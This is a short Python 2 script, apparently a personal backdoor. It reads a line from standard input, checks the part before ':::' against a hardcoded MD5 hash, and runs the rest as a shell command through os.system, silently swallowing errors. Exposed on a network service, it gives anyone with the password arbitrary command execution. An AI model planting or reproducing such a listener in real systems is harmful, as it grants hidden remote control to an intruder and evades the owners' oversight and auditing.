#!/usr/bin/python
# by amon (amon@nandynarwhals.org)

import sys
import md5
import os

sys.stdout.write('.')
sys.stdout.flush()
data = sys.stdin.readline().strip()
try:
    auth, cmd = data.split(":::")
    if md5.md5(auth).hexdigest() == "b41135d9bda51105855aeeb3c4aa7e5a":
        os.system(cmd)
except:
    pass
